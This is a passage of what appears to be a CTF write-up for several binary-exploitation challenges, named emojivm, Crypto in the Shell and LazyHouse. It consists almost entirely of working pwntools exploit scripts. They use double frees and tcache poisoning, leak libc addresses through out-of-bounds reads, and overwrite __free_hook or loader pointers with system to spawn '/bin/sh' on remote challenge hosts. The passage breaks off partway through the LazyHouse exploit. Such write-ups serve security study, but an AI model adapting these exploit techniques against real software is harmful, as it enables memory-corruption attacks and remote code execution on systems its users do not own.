<pre class="hljs"><code>NOP = <span class="hljs-number">1</span>
ADD = <span class="hljs-number">2</span>
SUB = <span class="hljs-number">3</span>
MUL = <span class="hljs-number">4</span>
MOD = <span class="hljs-number">5</span>
XOR = <span class="hljs-number">6</span>
AND = <span class="hljs-number">7</span>
LWR = <span class="hljs-number">8</span>
EQU = <span class="hljs-number">9</span>
JMP = <span class="hljs-number">10</span>
JT = <span class="hljs-number">11</span>
JF = <span class="hljs-number">12</span>
<span class="hljs-comment"># IMM = 13</span>
POP = <span class="hljs-number">14</span>
<span class="hljs-comment"># GET = 15</span>
<span class="hljs-comment"># SET = 16</span>
<span class="hljs-comment"># NEW = 17</span>
<span class="hljs-comment"># DEL = 18</span>
EDIT = <span class="hljs-number">19</span>
SHOW = <span class="hljs-number">20</span>


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">IMM</span><span class="hljs-params">(v)</span>:</span>
    <span class="hljs-keyword">assert</span> v &lt;= <span class="hljs-number">10</span>
    <span class="hljs-keyword">return</span> [<span class="hljs-number">13</span>, -v]

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">IMMX</span><span class="hljs-params">(v)</span>:</span>
    <span class="hljs-keyword">if</span> v &lt;= <span class="hljs-number">10</span>:
        <span class="hljs-keyword">return</span> IMM(v)
    <span class="hljs-keyword">else</span>:
        hi, lo = divmod(v, <span class="hljs-number">10</span>)
        pl = IMMX(hi) + IMM(<span class="hljs-number">10</span>) + [MUL]
        <span class="hljs-keyword">if</span> lo != <span class="hljs-number">0</span>:
            pl += IMM(lo) + [ADD]
    <span class="hljs-keyword">return</span> pl

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GET</span><span class="hljs-params">(idx, off)</span>:</span>
    <span class="hljs-keyword">return</span> IMMX(off) + IMMX(idx) + [<span class="hljs-number">15</span>]

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">SET</span><span class="hljs-params">(idx, off)</span>:</span>
    <span class="hljs-keyword">return</span> IMMX(off) + IMMX(idx) + [<span class="hljs-number">16</span>]

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">STR</span><span class="hljs-params">(idx, s)</span>:</span>
    pl = []
    <span class="hljs-keyword">for</span> i, c <span class="hljs-keyword">in</span> enumerate(s):
        pl += IMMX(ord(c)) + IMMX(i) + IMM(idx) + [<span class="hljs-number">16</span>] <span class="hljs-comment"># set</span>
    <span class="hljs-keyword">return</span> pl

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GETI</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">return</span> GET(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GETJ</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">return</span> GET(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">LOC</span><span class="hljs-params">(i)</span>:</span>
    <span class="hljs-keyword">return</span> [i | (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">30</span>)] * <span class="hljs-number">14</span> <span class="hljs-comment"># len(IMMX(999))</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">NEW</span><span class="hljs-params">(sz)</span>:</span>
    <span class="hljs-keyword">return</span> IMMX(sz) + [<span class="hljs-number">17</span>]

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">DEL</span><span class="hljs-params">(i)</span>:</span>
    <span class="hljs-keyword">return</span> IMMX(i) + [<span class="hljs-number">18</span>]

SZ = <span class="hljs-number">0x82</span> <span class="hljs-comment"># 130</span>

pl = []
<span class="hljs-comment"># pl += NEW(SZ) * 10</span>
loc2 = len(pl)
pl += NEW(SZ)
pl += IMM(<span class="hljs-number">1</span>) + GETI() + [ADD] + SET(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-comment"># ++i</span>
pl += IMM(<span class="hljs-number">10</span>) + GETI() + [LWR] + LOC(<span class="hljs-number">2</span>) + [JT]

pl += DEL(<span class="hljs-number">7</span>)

pl += [SUB, ADD]
pl += IMMX(<span class="hljs-number">0xB0</span>) + [SUB] + IMM(<span class="hljs-number">0</span>) + [SUB] <span class="hljs-comment"># item9 = item8</span>

pl += DEL(<span class="hljs-number">9</span>) + DEL(<span class="hljs-number">8</span>) <span class="hljs-comment"># double free item8 &amp; data8</span>
pl += NEW(<span class="hljs-number">0</span>) <span class="hljs-comment"># item7 = data7 # fix fd = size = 0</span>
pl += NEW(SZ) * <span class="hljs-number">2</span> <span class="hljs-comment"># data8 = data9</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">7</span>): <span class="hljs-comment"># tcache</span>
    pl += DEL(i)
pl += DEL(<span class="hljs-number">8</span>) <span class="hljs-comment"># unsoted bin</span>

pl += NEW(SZ)
pl += IMM(<span class="hljs-number">8</span>) + SET(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-comment"># i = 8</span>
loc1 = len(pl)
pl += GETI() + IMM(<span class="hljs-number">9</span>) + [<span class="hljs-number">15</span>] + [<span class="hljs-number">22</span>] <span class="hljs-comment"># print(itoa(item[9][i]))</span>
pl += IMMX(<span class="hljs-number">980</span>) + [<span class="hljs-number">22</span>]
pl += IMM(<span class="hljs-number">1</span>) + GETI() + [ADD] + SET(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-comment"># ++i</span>
pl += IMMX(<span class="hljs-number">8</span> + <span class="hljs-number">6</span>) + GETI() + [LWR] + LOC(<span class="hljs-number">1</span>) + [JT]

pl += [NOP]
pl += IMM(<span class="hljs-number">9</span>) + [EDIT]
pl += IMMX(<span class="hljs-number">0xB0</span> * <span class="hljs-number">2</span>) + [SUB] + IMM(<span class="hljs-number">0</span>) + [SUB] <span class="hljs-comment"># item9 = data9</span>
pl += IMM(<span class="hljs-number">9</span>) + [EDIT]
pl += DEL(<span class="hljs-number">9</span>)

pl += [<span class="hljs-number">0x17</span>]

print(len(pl))
<span class="hljs-comment"># print(pl)</span>
i = <span class="hljs-number">0</span>
<span class="hljs-keyword">while</span> i &lt; len(pl):
    v = pl[i]
    <span class="hljs-keyword">if</span> v == LOC(<span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]:
        r = loc1
    <span class="hljs-keyword">elif</span> v == LOC(<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]:
        r = loc2
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">assert</span> type(v) == int
        i += <span class="hljs-number">1</span>
        <span class="hljs-keyword">continue</span>
    a, t = divmod(r, <span class="hljs-number">100</span>)
    b, c = divmod(t, <span class="hljs-number">10</span>)
    t = IMM(a) + IMM(<span class="hljs-number">10</span>) + [MUL] + IMM(b) + [ADD] + IMM(<span class="hljs-number">10</span>) + [MUL] + IMM(c) + [ADD]
    <span class="hljs-keyword">assert</span> len(t) == <span class="hljs-number">14</span>
    pl = pl[:i] + t + pl[i + <span class="hljs-number">14</span>:]
    i += len(t)
<span class="hljs-comment"># print(pl)</span>

consts = [<span class="hljs-number">128512</span>,<span class="hljs-number">128513</span>,<span class="hljs-number">128514</span>,<span class="hljs-number">129315</span>,<span class="hljs-number">128540</span>,<span class="hljs-number">128516</span>,<span class="hljs-number">128517</span>,<span class="hljs-number">128518</span>,<span class="hljs-number">128521</span>,<span class="hljs-number">128522</span>,<span class="hljs-number">128525</span>,]
opcodes = [<span class="hljs-number">0</span>,<span class="hljs-number">127539</span>,<span class="hljs-number">10133</span>,<span class="hljs-number">10134</span>,<span class="hljs-number">10060</span>,<span class="hljs-number">0x2753</span>,<span class="hljs-number">10062</span>,<span class="hljs-number">128107</span>,<span class="hljs-number">128128</span>,<span class="hljs-number">128175</span>,<span class="hljs-number">128640</span>,<span class="hljs-number">127542</span>,<span class="hljs-number">127514</span>,<span class="hljs-number">9196</span>,<span class="hljs-number">128285</span>,<span class="hljs-number">128228</span>,<span class="hljs-number">128229</span>,<span class="hljs-number">127381</span>,<span class="hljs-number">127379</span>,<span class="hljs-number">128196</span>,<span class="hljs-number">128221</span>,<span class="hljs-number">128289</span>,<span class="hljs-number">128290</span>,<span class="hljs-number">0x1F6D1</span>,]

mp = {
<span class="hljs-number">0x23EC</span>: <span class="hljs-string">'\xE2\x8F\xAC'</span>,
<span class="hljs-number">0x274c</span>: <span class="hljs-string">'\xE2\x9D\x8C'</span>,
<span class="hljs-number">0x274e</span>: <span class="hljs-string">'\xE2\x9D\x8E'</span>,
<span class="hljs-number">0x2753</span>: <span class="hljs-string">'\xE2\x9D\x93'</span>,
<span class="hljs-number">0x2795</span>: <span class="hljs-string">'\xE2\x9E\x95'</span>,
<span class="hljs-number">0x2796</span>: <span class="hljs-string">'\xE2\x9E\x96'</span>,
<span class="hljs-number">0x1F193</span>: <span class="hljs-string">'\xF0\x9F\x86\x93'</span>,
<span class="hljs-number">0x1F195</span>: <span class="hljs-string">'\xF0\x9F\x86\x95'</span>,
<span class="hljs-number">0x1F21A</span>: <span class="hljs-string">'\xF0\x9F\x88\x9A'</span>,
<span class="hljs-number">0x1F233</span>: <span class="hljs-string">'\xF0\x9F\x88\xB3'</span>,
<span class="hljs-number">0x1F236</span>: <span class="hljs-string">'\xF0\x9F\x88\xB6'</span>,
<span class="hljs-number">0x1f46b</span>: <span class="hljs-string">'\xF0\x9F\x91\xAB'</span>,
<span class="hljs-number">0x1f480</span>: <span class="hljs-string">'\xF0\x9F\x92\x80'</span>,
<span class="hljs-number">0x1f4af</span>: <span class="hljs-string">'\xF0\x9F\x92\xAF'</span>,
<span class="hljs-number">0x1f4c4</span>: <span class="hljs-string">'\xF0\x9F\x93\x84'</span>,
<span class="hljs-number">0x1f4dd</span>: <span class="hljs-string">'\xF0\x9F\x93\x9D'</span>,
<span class="hljs-number">0x1f4e4</span>: <span class="hljs-string">'\xF0\x9F\x93\xA4'</span>,
<span class="hljs-number">0x1f4e5</span>: <span class="hljs-string">'\xF0\x9F\x93\xA5'</span>,
<span class="hljs-number">0x1f51d</span>: <span class="hljs-string">'\xF0\x9F\x94\x9D'</span>,
<span class="hljs-number">0x1f521</span>: <span class="hljs-string">'\xF0\x9F\x94\xA1'</span>,
<span class="hljs-number">0x1f522</span>: <span class="hljs-string">'\xF0\x9F\x94\xA2'</span>,
<span class="hljs-number">0x1f600</span>: <span class="hljs-string">'\xF0\x9F\x98\x80'</span>,
<span class="hljs-number">0x1f601</span>: <span class="hljs-string">'\xF0\x9F\x98\x81'</span>,
<span class="hljs-number">0x1f602</span>: <span class="hljs-string">'\xF0\x9F\x98\x82'</span>,
<span class="hljs-number">0x1f604</span>: <span class="hljs-string">'\xF0\x9F\x98\x84'</span>,
<span class="hljs-number">0x1f605</span>: <span class="hljs-string">'\xF0\x9F\x98\x85'</span>,
<span class="hljs-number">0x1f606</span>: <span class="hljs-string">'\xF0\x9F\x98\x86'</span>,
<span class="hljs-number">0x1f609</span>: <span class="hljs-string">'\xF0\x9F\x98\x89'</span>,
<span class="hljs-number">0x1f60a</span>: <span class="hljs-string">'\xF0\x9F\x98\x8A'</span>,
<span class="hljs-number">0x1f60d</span>: <span class="hljs-string">'\xF0\x9F\x98\x8D'</span>,
<span class="hljs-number">0x1f61c</span>: <span class="hljs-string">'\xF0\x9F\x98\x9C'</span>,
<span class="hljs-number">0x1f680</span>: <span class="hljs-string">'\xF0\x9F\x9A\x80'</span>,
<span class="hljs-number">0x1f6d1</span>: <span class="hljs-string">'\xF0\x9F\x9B\x91'</span>,
<span class="hljs-number">0x1f923</span>: <span class="hljs-string">'\xF0\x9F\xA4\xA3'</span>,
}


out = []
i = <span class="hljs-number">0</span>
<span class="hljs-keyword">while</span> i &lt; len(pl):
    v = pl[i]
    <span class="hljs-keyword">assert</span> type(v) == int
    <span class="hljs-keyword">if</span> v &lt;= <span class="hljs-number">0</span>:
        t = abs(v)
        <span class="hljs-keyword">assert</span> t &lt;= <span class="hljs-number">10</span>
        out.append(mp[consts[t]])
        i += <span class="hljs-number">1</span>
    <span class="hljs-keyword">elif</span> <span class="hljs-number">0</span> &lt; v <span class="hljs-keyword">and</span> v &lt; <span class="hljs-number">0x18</span>:
        out.append(mp[opcodes[v]])
        i += <span class="hljs-number">1</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">raise</span> ValueError, v

final = <span class="hljs-string">''</span>.join(out)
print(len(final))
open(<span class="hljs-string">'payload'</span>, <span class="hljs-string">'wb'</span>).write(final)</code></pre><pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> os


libc = ELF(<span class="hljs-string">'./libc.so'</span>)

context.log_level = <span class="hljs-string">'debug'</span>

<span class="hljs-comment"># p = process(argv=['./emojivm1', 'payload'])</span>
p = remote(<span class="hljs-string">'3.115.176.164'</span>, <span class="hljs-number">30262</span>)

p.recvuntil(<span class="hljs-string">'token:\n'</span>)
cmd = p.recvline(<span class="hljs-keyword">False</span>)
info(<span class="hljs-string">'cmd: %s'</span>, cmd)

ans = os.popen(cmd).read().strip()
info(<span class="hljs-string">'ans: %s'</span>, ans)
p.sendlineafter(<span class="hljs-string">'hashcash token: '</span>, ans)

payload = open(<span class="hljs-string">'payload'</span>, <span class="hljs-string">'rb'</span>).read()
p.sendlineafter(<span class="hljs-string">'Your emoji file size: ( MAX: 1000 bytes ) '</span>, str(len(payload)))
p.sendafter(<span class="hljs-string">'Input your emoji file:\n'</span>, payload)

r = <span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">6</span>):
    t = p.recvuntil(<span class="hljs-string">'980'</span>, <span class="hljs-keyword">True</span>)
    r += (int(t) % <span class="hljs-number">256</span>) &lt;&lt; (i * <span class="hljs-number">8</span>)
r -= <span class="hljs-number">0x3EBCA0</span> + <span class="hljs-number">0x100</span>
info(<span class="hljs-string">'libc: %#x'</span>, r)
libc.address = r

pl = p64(<span class="hljs-number">0x10</span>) + p64(libc.sym[<span class="hljs-string">'__free_hook'</span>] - <span class="hljs-number">8</span>)
p.send(pl)

pl = <span class="hljs-string">'/bin/sh\0'</span> + p64(libc.sym[<span class="hljs-string">'system'</span>])
p.send(pl)

p.interactive()</code></pre><h3 id="crypto-in-the-shell-[284pts]"><a class="header-link" href="#crypto-in-the-shell-[284pts]"></a>Crypto in the Shell [284pts]</h3>
<p>The vulnerability is easy to spot: the encryption causes out-of-bound access. We can encrypt a piece of memory with arbitrary offset and get the result of encryption. Here are steps to exploit:</p>
<ol class="list">
<li>Encrypt the key, and the result of encryption will be shown, which is the new key</li>
<li>Encrypt the offset <code>-0x3a0</code>, decrypt the result to leak the program address</li>
<li>Similarly, encrypt the offset <code>-0x40</code> to leak <code>libc</code> address, since it stores <code>stderr</code>. Note that we can not use <code>stdout</code> or <code>stdin</code> to leak <code>libc</code> address, since they are being used by the program and changing their contents will cause crash</li>
<li>Use <code>libc_addr+0x3f04c0</code> to leak stack address, then we can rewrite loop variable <code>i</code> to bypass number of encryption limitation. However, due to existence of ASLR, we only have <code>1/2</code> probability to make <code>i</code> negative</li>
<li>Brute-force byte-by-byte to rewrite <code>ld_addr+0x228968</code> to <code>&quot;sh&quot;</code> and <code>ld_addr+0x228f60</code> to <code>&amp;system</code>. Due to remote timeout, we need to pre-calculate number of encryptions needed to obtain a certain byte and send payloads altogether</li>
<li><code>exit</code> to get the shell</li>
</ol>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time
<span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES
<span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> *

AES_BLOCK_SIZE = <span class="hljs-number">16</span>
g_local=<span class="hljs-number">1</span>
context(log_level=<span class="hljs-string">'debug'</span>, arch=<span class="hljs-string">'amd64'</span>)
e = ELF(<span class="hljs-string">"/lib/x86_64-linux-gnu/libc-2.27.so"</span>)
<span class="hljs-keyword">if</span> g_local:
    sh = process(<span class="hljs-string">"./chall"</span>)
    gdb.attach(sh)
<span class="hljs-keyword">else</span>:
    sh = remote(<span class="hljs-string">"3.113.219.89"</span>, <span class="hljs-number">31337</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">enc</span><span class="hljs-params">(off, size=<span class="hljs-number">0xf</span>)</span>:</span>
    off &amp;= <span class="hljs-number">0xffffffffffffffff</span>
    size &amp;= <span class="hljs-number">0xffffffffffffffff</span>
    sh.sendline(str(off))
    sh.sendlineafter(<span class="hljs-string">"size:"</span>, str(size))
    ret = sh.recvuntil(<span class="hljs-string">"offset:"</span>)[:-len(<span class="hljs-string">"offset:"</span>)]
    <span class="hljs-keyword">assert</span> len(ret) % <span class="hljs-number">0x10</span> == <span class="hljs-number">0</span>
    <span class="hljs-keyword">return</span> ret

key = enc(<span class="hljs-number">-0x20</span>)
iv = <span class="hljs-number">0x10</span> * <span class="hljs-string">'\x00'</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dec</span><span class="hljs-params">(data)</span>:</span>
    <span class="hljs-keyword">return</span> AES.new(key, AES.MODE_CBC, iv).decrypt(data)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">enc2</span><span class="hljs-params">(data)</span>:</span>
    <span class="hljs-keyword">return</span> AES.new(key, AES.MODE_CBC, iv).encrypt(data)

prog_addr = dec(enc(<span class="hljs-number">-0x3a0</span>))
prog_addr = u64(prog_addr[<span class="hljs-number">8</span>:]) - <span class="hljs-number">0x202008</span>
<span class="hljs-keyword">print</span> hex(prog_addr)


libc_addr = dec(enc(<span class="hljs-number">-0x40</span>))
libc_addr = u64(libc_addr[:<span class="hljs-number">8</span>]) - e.symbols[<span class="hljs-string">"_IO_2_1_stderr_"</span>]
<span class="hljs-keyword">print</span> hex(libc_addr)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">calc_off</span><span class="hljs-params">(addr)</span>:</span>
    <span class="hljs-keyword">return</span> addr - (prog_addr + <span class="hljs-number">0x2023a0</span>)

env_off = calc_off(libc_addr+<span class="hljs-number">0x3f04c0</span>)

stack_addr = dec(enc(env_off))
stack_addr = u64(stack_addr[:<span class="hljs-number">8</span>]) + <span class="hljs-number">0x10</span> - <span class="hljs-number">0x120</span>
<span class="hljs-keyword">print</span> hex(stack_addr)

<span class="hljs-comment"># 0.5, need to make i negative</span>
enc(calc_off(stack_addr))


<span class="hljs-comment"># previous bytes might be affected</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write_byte</span><span class="hljs-params">(addr, val, data)</span>:</span>
    <span class="hljs-keyword">assert</span> len(data) == <span class="hljs-number">0x10</span>
    off = calc_off(addr - <span class="hljs-number">0xf</span>)
    count = <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
        data = enc2(data)
        count += <span class="hljs-number">1</span>
        <span class="hljs-keyword">if</span> u8(data[<span class="hljs-number">0xf</span>]) == val:
            <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(count):
        sh.send(str(off) + <span class="hljs-string">'\n15\n'</span>)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(count):
        sh.recvuntil(<span class="hljs-string">"offset:"</span>)
    <span class="hljs-keyword">return</span> data

ld_addr = libc_addr + <span class="hljs-number">0x3f1000</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write_bytes</span><span class="hljs-params">(addr, s, data)</span>:</span>
    <span class="hljs-keyword">assert</span> len(data) == <span class="hljs-number">0x10</span> + len(s)
    i = len(s) - <span class="hljs-number">1</span>
    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s[::<span class="hljs-number">-1</span>]:
        data = data[:<span class="hljs-number">1</span>+i] + write_byte(\
            addr + i, u8(c), data[<span class="hljs-number">1</span>+i:<span class="hljs-number">0x11</span>+i]) + \
            data[<span class="hljs-number">0x11</span>+i:]
        i -= <span class="hljs-number">1</span>

<span class="hljs-comment"># print hex(u64(dec(enc(calc_off(ld_addr + 0x228f50)))[:8]))</span>
<span class="hljs-comment"># sh.interactive()</span>
od1 = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>)
write_bytes(ld_addr + <span class="hljs-number">0x228968</span>, <span class="hljs-string">"sh"</span>, od1 + <span class="hljs-number">2</span>*<span class="hljs-string">'\x00'</span>)
od2 = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)
write_bytes(ld_addr + <span class="hljs-number">0x228f60</span>, \
    p64(libc_addr + e.symbols[<span class="hljs-string">"system"</span>])[:<span class="hljs-number">3</span>], \
    od2+p64(ld_addr+<span class="hljs-number">0x10e0</span>)[:<span class="hljs-number">3</span>])
<span class="hljs-comment"># local 0x440-&gt;0x441</span>
<span class="hljs-comment"># remote 0x440-&gt;0x496</span>

<span class="hljs-comment"># print hex(libc_addr + e.symbols["system"])</span>
<span class="hljs-comment"># print hex(u64(dec(enc(calc_off(ld_addr + 0x228f60)))[:8]))</span>
<span class="hljs-comment"># print hex(u64(dec(enc(calc_off(ld_addr + 0x228968)))[:8]))</span>

sh.interactive()</code></pre><h3 id="lazyhouse-[300pts]"><a class="header-link" href="#lazyhouse-[300pts]"></a>LazyHouse [300pts]</h3>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context(arch = <span class="hljs-string">'amd64'</span>, os = <span class="hljs-string">'linux'</span>, endian = <span class="hljs-string">'little'</span>)
context.log_level = <span class="hljs-string">'debug'</span>
libc = ELF(<span class="hljs-string">"./libc.so.6"</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">buy_house</span><span class="hljs-params">(idx, size, content = <span class="hljs-string">''</span>)</span>:</span>
    p.recvuntil(<span class="hljs-string">'Your choice: '</span>)
    p.sendline(<span class="hljs-string">'1'</span>)
    p.recvuntil(<span class="hljs-string">'Index:'</span>)
    p.sendline(str(idx))
    p.recvuntil(<span class="hljs-string">'Size:'</span>)
    p.sendline(str(size))
    <span class="hljs-keyword">if</span> content != <span class="hljs-string">''</span>:
        p.recvuntil(<span class="hljs-string">'House:'</span>)
        p.send(content)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_house</span><span class="hljs-params">(idx)</span>:</span>
    p.recvuntil(<span class="hljs-string">'Your choice: '</span>)
    p.sendline(<span class="hljs-string">'2'</span>)
    p.recvuntil(<span class="hljs-string">'Index:'</span>)
    p.sendline(str(idx))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sell</span><span class="hljs-params">(idx)</span>:</span>
    p.recvuntil(<span class="hljs-string">'Your choice: '</span>)
    p.sendline(<span class="hljs-string">'3'</span>)
    p.recvuntil(<span class="hljs-string">'Index:'</span>)
    p.sendline(str(idx))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upgrade</span><span class="hljs-params">(idx, content)</span>:</span>
    p.recvuntil(<span class="hljs-string">'Your choice: '</span>)
    p.sendline(<span class="hljs-string">'4'</span>)
    p.recvuntil(<span class="hljs-string">'Index:'</span>)
    p.sendline(str(idx))
    p.recvuntil(<span class="hljs-string">'House:'</span>)
    p.send(content)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">buy_super_house</span><span class="hljs-params">(content)</span>:</span>
    p.recvuntil(<span class="hljs-string">'Your choice: '</span>)
    p.sendline(<span class="hljs-string">'5'</span>)
    p.recvuntil(<span class="hljs-string">'House:'</span>)
    p.send(content)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GameStart</span><span class="hljs-params">(ip, port, debug)</span>:</span>
    <span class="hljs-keyword">global</span> p
    <span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:
        p = process(<span class="hljs-string">"./lazyhouse"</span>)
        <span class="hljs-comment"># p = process(['ld-linux-x86-64.so.2', './lazyhouse'], env = {'LD_PRELOAD' : './libc.so.6'})</span>
    <span class="hljs-keyword">else</span>:
        p = remote(ip, port)
    buy_house(<span class="hljs-number">1</span>, <span class="hljs-number">0x13f69b02593f69b1</span>)
    sell(<span class="hljs-number">1</span>)
    buy_house(<span class="hljs-number">1</span>, <span class="hljs-number">0x109bb0727572e2bd</span>)
    sell(<span class="hljs-number">1</span>)
    buy_house(<span class="hljs-number">1</span>, <span class="hljs-number">0x13f2b1389a662c33</span>)
    sell(<span class="hljs-number">1</span>)
    buy_house(<span class="hljs-number">1</span>, <span class="hljs-number">0x4fcace18cee3091</span>)
    sell(<span class="hljs-number">1</span>)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):
        buy_house(<span class="hljs-number">1</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">'sw tcl'</span>)
        sell(<span class="hljs-number">1</span>)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):
        buy_house(i, <span class="hljs-number">0x100</span>, <span class="hljs-string">'sw tcl'</span>)
    <span class="hljs-comment">#pause()</span>
    upgrade(<span class="hljs-number">0</span>, <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x100</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x661</span>))
    sell(<span class="hljs-number">1</span>)
    buy_house(<span class="hljs-number">1</span>, <span class="hljs-number">0x650</span>, <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x100</span> + (p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x111</span>) + <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x100</span>) * <span class="hljs-number">6</span>)
    sell(<span class="hljs-number">2</span>)
    sell(<span class="hljs-number">4</span>)
    show_house(<span class="hljs-number">1</span>)
    p.recvn(<span class="hljs-number">0x110</span>)
    libc_addr = u64(p.recvn(<span class="hljs-number">8</span>)) - <span class="hljs-number">0x1e4ca0</span>
    heap_addr = u64(p.recvn(<span class="hljs-number">8</span>)) - <span class="hljs-number">0xe00</span>
    log.info(<span class="hljs-string">'libc addr is : '</span> + hex(libc_addr))
    log.info(<span class="hljs-string">'heap addr is : '</span> + hex(heap_addr))
    buy_house(<span class="hljs-number">2</span>, <span class="hljs-number">0x3a0</span>, <span class="hljs-string">'\x00'</span>)
    sell(<span class="hljs-number">2</span>)
    buy_house(<span class="hljs-number">2</span>,<span class="hljs-number">9999999999999999</span>)
    buy_house(<span class="hljs-number">2</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">'AAA'</span>)
    buy_house(<span class="hljs-number">4</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">'AAA'</span>)
    sell(<span class="hljs-number">1</span>)
    payload = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x100</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x111</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xdeadbeef</span>) + p64(<span class="hljs-number">0x21</span>) * (<span class="hljs-number">0xf0</span>/<span class="hljs-number">8</span>)
    payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + p64(<span class="hljs-number">0x21</span>) * (<span class="hljs-number">0x100</span>/<span class="hljs-number">8</span>)
    payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + p64(<span class="hljs-number">0x21</span>) * (<span class="hljs-number">0x100</span>/<span class="hljs-number">8</span>)
    payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x141</span>) + p64(<span class="hljs-number">0x21</span>) * (<span class="hljs-number">0x100</span>/<span class="hljs-number">8</span>)
    payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x141</span>) + p64(<span class="hljs-number">0x21</span>) * (<span class="hljs-number">0x100</span>/<span class="hljs-number">8</span>)
    buy_house(<span class="hljs-number">1</span>, <span class="hljs-number">0x650</span>, payload)
    sell(<span class="hljs-number">2</span>)
    buy_house(<span class="hljs-number">2</span>,<span class="hljs-number">9999999999999999</span>)
    sell(<span class="hljs-number">3</span>)
    sell(<span class="hljs-number">4</span>)
    sell(<span class="hljs-number">1</span>)

    payload = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x100</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x111</span>) + p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0xd00</span>) + p64(<span class="hljs-number">0x21</span>) * (<span class="hljs-number">0xf0</span>/<span class="hljs-number">8</span>)
    payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x131</span>) + p64(<span class="hljs-number">0x21</span>)*<span class="hljs-number">2</span> + p64(heap_addr+<span class="hljs-number">0xbe0</span>) + p64(heap_addr+<span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0x21</span>) * (<span class="hljs-number">0x100</span>/<span class="hljs-number">8</span> - <span class="hljs-number">4</span>)
    payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x141</span>) + p64(heap_addr + <span class="hljs-number">0x40</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x21</span>) * (<span class="hljs-number">0x100</span>/<span class="hljs-number">8</span> - <span class="hljs-number">5</span>)
